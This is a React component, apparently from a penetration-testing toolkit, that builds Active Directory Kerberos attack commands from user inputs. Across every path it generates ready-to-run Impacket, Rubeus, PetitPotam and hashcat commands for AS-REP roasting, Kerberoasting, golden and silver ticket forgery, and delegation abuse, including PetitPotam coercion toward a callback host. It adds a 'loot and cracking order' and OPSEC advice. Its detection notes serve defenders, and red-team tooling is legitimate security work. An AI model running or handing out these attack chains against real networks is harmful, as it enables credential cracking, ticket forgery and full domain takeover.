import { useMemo, useState } from 'react';
import { Callout, Card, CodeBlock, KVTable, SectionTitle, Select, Tabs, TextInput } from '@/components/ui';
import { DEFAULT_CALLBACK_HOST, DEFAULT_TARGET, DEFAULT_TARGET_IP } from '@/tools/registry';

type PathId = 'asrep' | 'kerberoast' | 'golden' | 'silver' | 'delegation';
type Delegation = 'unconstrained' | 'constrained' | 'rbcd';

interface Command {
  label: string;
  code: string;
}

interface Plan {
  prereqs: string;
  artefact: string;
  modes: string;
  detection: string;
  commands: Command[];
}

const PATHS: Array<{ value: PathId; label: string }> = [
  { value: 'asrep', label: 'AS-REP roast' },
  { value: 'kerberoast', label: 'Kerberoast' },
  { value: 'golden', label: 'Golden ticket' },
  { value: 'silver', label: 'Silver ticket' },
  { value: 'delegation', label: 'Delegation' },
];

const DELEGATION: Array<{ value: Delegation; label: string }> = [
  { value: 'unconstrained', label: 'Unconstrained — capture a TGT' },
  { value: 'constrained', label: 'Constrained — S4U2Self + S4U2Proxy' },
  { value: 'rbcd', label: 'Resource-based (RBCD)' },
];

const USERS = 'users.txt';
const SID_FALLBACK = 'S-1-5-21-1004336348-1177238915-682003330';

export default function KerberosAttackPlanner() {
  const [domain, setDomain] = useState(DEFAULT_TARGET);
  const [dc, setDc] = useState(DEFAULT_TARGET_IP);
  const [user, setUser] = useState('svc-backup');
  const [spn, setSpn] = useState(`cifs/files01.${DEFAULT_TARGET}`);
  const [cred, setCred] = useState('lowpriv:Password123');
  const [sid, setSid] = useState(SID_FALLBACK);
  const [krbtgt, setKrbtgt] = useState('6f1d3c0b8a4e29d7c5b13f80a9e46d2c');
  const [svcHash, setSvcHash] = useState('9a3d7f21c48b05e6d2a1f9c7b3e8405d');
  const [path, setPath] = useState<PathId>('asrep');
  const [delegation, setDelegation] = useState<Delegation>('constrained');

  const realm = domain.trim() || DEFAULT_TARGET;
  const dcIp = dc.trim() || DEFAULT_TARGET_IP;
  const principal = `${realm}/${cred.trim() || 'lowpriv:Password123'}`;
  const targetUser = user.trim() || 'svc-backup';
  const serviceSpn = spn.trim() || `cifs/files01.${realm}`;
  const domainSid = sid.trim() || SID_FALLBACK;

  const plans = useMemo<Record<PathId, Plan>>(() => {
    const getNpUsersFile = `GetNPUsers.py ${realm}/ -dc-ip ${dcIp} -no-pass -usersfile ${USERS} -format hashcat -outputfile asrep.hash`;
    const getNpSingle = `GetNPUsers.py ${realm}/${targetUser} -dc-ip ${dcIp} -no-pass -format hashcat`;
    const spnRequest = `GetUserSPNs.py ${principal} -dc-ip ${dcIp} -request -outputfile tgs.hash`;

    return {
      asrep: {
        prereqs:
          'Target account has "Do not require Kerberos preauthentication" set (UF_DONT_REQUIRE_PREAUTH). No password is needed for the roast; only a username list. Users with a blank pre-auth flag are the whole attack surface.',
        artefact: 'AS-REP blob → hashcat line $krb5asrep$23$USER@REALM:... (etype 23) or $krb5asrep$17/$18 for AES.',
        modes: '-m 18200 (etype 23 RC4) · -m 19800 (AES-128) · -m 19900 (AES-256)',
        detection:
          '4768 with Pre-Authentication Type = 0 for an account whose msDS-User-Account-Control-Computed says pre-auth is required. One 4768 per name in the user file, all from one source address, within seconds.',
        commands: [
          { label: 'Enumerate then roast', code: `${getNpUsersFile}\nhashcat -m 18200 asrep.hash words.txt -r rules/best64.rule` },
          { label: 'Single principal', code: getNpSingle },
        ],
      },
      kerberoast: {
        prereqs:
          'Any authenticated domain user. The target must hold an SPN and issue a crackable etype. Accounts with AES-only etypes still roast, just at -m 19600/-m 19700. Service accounts with Domain Admin rights are the prize.',
        artefact: 'TGS-REP blob → hashcat line $krb5tgs$23$*USER$REALM$spn*$... — a service-ticket encrypted with the service account key.',
        modes: '-m 13100 (etype 23 RC4) · -m 19600 (AES-128) · -m 19700 (AES-256)',
        detection:
          '4769 with Ticket Encryption Type 0x17 (RC4) on accounts that normally negotiate AES; a burst of 4769 for many SPNs from one principal in a short window.',
        commands: [
          { label: 'Request every SPN ticket', code: `${spnRequest}\nhashcat -m 13100 tgs.hash words.txt -r rules/best64.rule` },
          { label: 'Targeted account', code: `GetUserSPNs.py ${principal} -dc-ip ${dcIp} -request-user ${targetUser} -outputfile tgs.hash` },
        ],
      },
      golden: {
        prereqs:
          'The krbtgt NT hash or AES key plus the domain SID. Normally from DCSync (Domain Admin or DS-Replication-Get-Changes-All). A forged TGT is valid until krbtgt is rotated twice, which is why rotation is the only real remediation.',
        artefact:
          'A TGT (ccache or kirbi) with an arbitrary PAC: any user, any group, any SID history. Domain-wide access without touching a DC password.',
        modes: 'Not cracked — the key is the requirement. Captured TGTs land in -m 19600 / -m 19700 only if you are recovering a key you do not have.',
        detection:
          '4769 issued with no preceding 4768 for the same principal; TGT lifetime far outside domain policy; 4624 type 3 across many hosts from one account within minutes.',
        commands: [
          {
            label: 'Forge and load',
            code: `ticketer.py -nthash ${krbtgt} -domain ${realm} -domain-sid ${domainSid} -dc-ip ${dcIp} Administrator\nexport KRB5CCNAME=Administrator.ccache\nnxc smb ${dcIp} -k --no-pass`,
          },
          {
            label: 'AES-256 variant',
            code: `ticketer.py -aesKey <krbtgt-aes256-hex> -domain ${realm} -domain-sid ${domainSid} -dc-ip ${dcIp} Administrator`,
          },
        ],
      },
      silver: {
        prereqs:
          'NT hash or AES key of the account running the service, plus its SPN. No DC contact is needed to use the ticket, so a compromised service account is enough — you never have to touch krbtgt.',
        artefact: `A TGS for one SPN (${serviceSpn}) encrypted with the service key. Host-local privilege only; the DC never sees the request.`,
        modes: 'Not cracked — service key required. Any captured TGS: -m 13100 / -m 19600 / -m 19700.',
        detection:
          '4769 for one SPN with no preceding 4768 anywhere in the domain; the service host logs 4624 type 3 while the DC logs nothing for that principal. Absence of DC telemetry is the signal.',
        commands: [
          {
            label: 'Forge a service ticket',
            code: `ticketer.py -nthash ${svcHash} -domain ${realm} -domain-sid ${domainSid} -spn ${serviceSpn} -dc-ip ${dcIp} Administrator\nexport KRB5CCNAME=Administrator.ccache\necho 'ls' | smbclient -k //files01.${realm}/c$`,
          },
          {
            label: 'Add SID history for local admin',
            code: `ticketer.py -nthash ${svcHash} -domain ${realm} -domain-sid ${domainSid} -spn ${serviceSpn} -groups 512,513,518,519,520 Administrator`,
          },
        ],
      },
      delegation: {
        prereqs:
          delegation === 'unconstrained'
            ? 'Write access to a host trusted for unconstrained delegation, or the ability to coerce authentication to it. Any inbound TGT cached there is reusable.'
            : delegation === 'constrained'
              ? 'An account trusted for protocol transition, or write access to msDS-AllowedToDelegateTo. S4U2Self mints the impersonated ticket, S4U2Proxy swaps it for the target SPN.'
              : 'Write on the target computer object\'s msDS-AllowedToActOnBehalfOfOtherIdentity plus one machine-account quota (default 10 for any user). No special rights beyond that.',
        artefact:
          delegation === 'unconstrained'
            ? 'A domain computer TGT captured from LSASS on the delegation host — replayable for the full ticket lifetime.'
            : 'A service ticket usable as the impersonated user against the target SPN (ccache). RBCD yields the same ticket through a controlled machine account.',
        modes: '-m 13100 on any captured TGS; S4U2Self/S4U2Proxy output is service-key encrypted, so the same rule applies.',
        detection:
          '4769 with Transited Services populated (S4U2Self/S4U2Proxy), 5136 on msDS-AllowedToActOnBehalfOfOtherIdentity, 4741 for the new machine account, 4624 type 3 on the delegation host from a DC.',
        commands:
          delegation === 'unconstrained'
            ? [
                {
                  label: 'Find and coerce',
                  code: `# hosts that cache inbound TGTs\nGet-DomainComputer -Unconstrained -Properties dnshostname\n# watch for the inbound TGT\nRubeus.exe monitor /interval:5 /nowrap\n# force the DC to authenticate to the listener\npython3 PetitPotam.py -d ${realm} -u ${cred.split(':')[0]} -p '${cred.split(':')[1] ?? 'Password123'}' ${DEFAULT_CALLBACK_HOST} ${dcIp}`,
                },
                { label: 'Replay', code: 'Rubeus.exe ptt /ticket:<base64-ticket>\nklist' },
              ]
            : delegation === 'constrained'
              ? [
                  {
                    label: 'S4U2Self + S4U2Proxy',
                    code: `getST.py -spn ${serviceSpn} -impersonate Administrator -dc-ip ${dcIp} ${principal}\nexport KRB5CCNAME=Administrator@cifs_files01.${realm}.ccache`,
                  },
                  {
                    label: 'Discover the delegation flag',
                    code: `Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto`,
                  },
                ]
              : [
                  {
                    label: '1 · Create a controlled machine account',
                    code: `addcomputer.py -computer-name 'RF01$' -computer-pass 'Passw0rd!123' -dc-ip ${dcIp} ${principal}`,
                  },
                  {
                    label: '2 · Grant RBCD on the target',
                    code: `rbcd.py -delegate-from 'RF01$' -delegate-to 'TARGET01$' -action write -dc-ip ${dcIp} ${principal}`,
                  },
                  {
                    label: '3 · Impersonate',
                    code: `getST.py -spn cifs/TARGET01.${realm} -impersonate Administrator -dc-ip ${dcIp} '${realm}/RF01$:Passw0rd!123'\nexport KRB5CCNAME=Administrator@cifs_TARGET01.${realm}.ccache`,
                  },
                ],
      },
    };
  }, [realm, dcIp, principal, targetUser, serviceSpn, domainSid, krbtgt, svcHash, delegation, cred]);

  const plan = plans[path];

  return (
    <>
      <Card title="Realm">
        <div className="grid gap-4 sm:grid-cols-2">
          <TextInput label="Domain" value={domain} onChange={setDomain} mono placeholder={DEFAULT_TARGET} hint="AD DNS name" />
          <TextInput label="Domain controller" value={dc} onChange={setDc} mono placeholder={DEFAULT_TARGET_IP} hint="IP or FQDN" />
          <TextInput label="Low-privileged credential" value={cred} onChange={setCred} mono hint="user:password" />
          <TextInput label="Target account" value={user} onChange={setUser} mono hint="AS-REP / SPN owner" />
          <TextInput label="Target SPN" value={spn} onChange={setSpn} mono hint="service/host" />
          <TextInput label="Domain SID" value={sid} onChange={setSid} mono hint="needed by ticketer.py" />
          <TextInput label="krbtgt NT hash" value={krbtgt} onChange={setKrbtgt} mono hint="32 hex chars" />
          <TextInput label="Service NT hash" value={svcHash} onChange={setSvcHash} mono hint="silver ticket key" />
        </div>
        <div className="mt-3 text-[11.5px] leading-relaxed text-[var(--text-faint)]">
          Values are placeholders — the commands are generated, never executed. Impacket scripts are normally run from a
          Linux attack host with the domain resolvable or <span className="rf-mono">-dc-ip</span> supplied.
        </div>
      </Card>

      <Card title="Attack path" action={<Tabs value={path} onChange={setPath} tabs={PATHS} />}>
        {path === 'delegation' && (
          <div className="mb-4 max-w-[420px]">
            <Select label="Delegation type" value={delegation} onChange={setDelegation} options={DELEGATION} />
          </div>
        )}
        <KVTable
          rows={[
            ['Prerequisites', plan.prereqs],
            ['Artefact', plan.artefact],
            ['Hashcat mode', plan.modes],
            ['Detection signal', plan.detection],
          ]}
        />
        <div className="mt-4 space-y-4">
          {plan.commands.map((c) => (
            <CodeBlock key={c.label} code={c.code} label={c.label} maxHeight={200} />
          ))}
        </div>
      </Card>

      <Card title="Loot and cracking order">
        <SectionTitle right={<span className="text-[11px] text-[var(--text-faint)]">stop at the first usable key</span>}>
          Sequence
        </SectionTitle>
        <KVTable
          rows={[
            ['1 · AS-REP', `No credentials needed. GetNPUsers.py against ${USERS} → hashcat -m 18200. Cheapest win.`],
            ['2 · Kerberoast', `One valid low-priv account (${cred.trim() || 'lowpriv:Password123'}) unlocks every SPN in the domain.`],
            ['3 · Delegation', 'A roasted service account that is trusted for delegation turns into a ticket for anything it can reach.'],
            ['4 · Silver', 'A service key from step 2 or 3 gives host-local admin without touching the DC.'],
            ['5 · Golden', 'Only after DCSync. Requires Domain Admin or replication rights; rotate krbtgt twice to evict.'],
          ]}
        />
        <div className="mt-4">
          <KVTable
            rows={[
              ['AS-REP (RC4)', <span className="rf-mono">hashcat -m 18200 asrep.hash words.txt</span>],
              ['TGS (RC4)', <span className="rf-mono">hashcat -m 13100 tgs.hash words.txt</span>],
              ['TGS (AES-128)', <span className="rf-mono">hashcat -m 19600 tgs.hash words.txt</span>],
              ['TGS (AES-256)', <span className="rf-mono">hashcat -m 19700 tgs.hash words.txt</span>],
            ]}
          />
        </div>
      </Card>

      <Card title="OPSEC notes">
        <Callout tone="warn" title="What each request leaves behind">
          4768/4769 pairs are the cheapest Kerberos telemetry to alert on: one principal asking for every SPN, or a
          pre-auth-less 4768, is a high-fidelity rule. Silver tickets are quiet on the DC but produce a 4769 with no 4768
          — pair the two logs or you will miss them entirely.
        </Callout>
        <div className="mt-3">
          <Callout tone="info" title="Clock skew">
            Kerberos rejects tickets more than five minutes out of sync. The forged ticket inherits the attacker host
            clock, so <span className="rf-mono">ntpdate</span> the DC before blaming the ticket.
          </Callout>
        </div>
      </Card>
    </>
  );
}
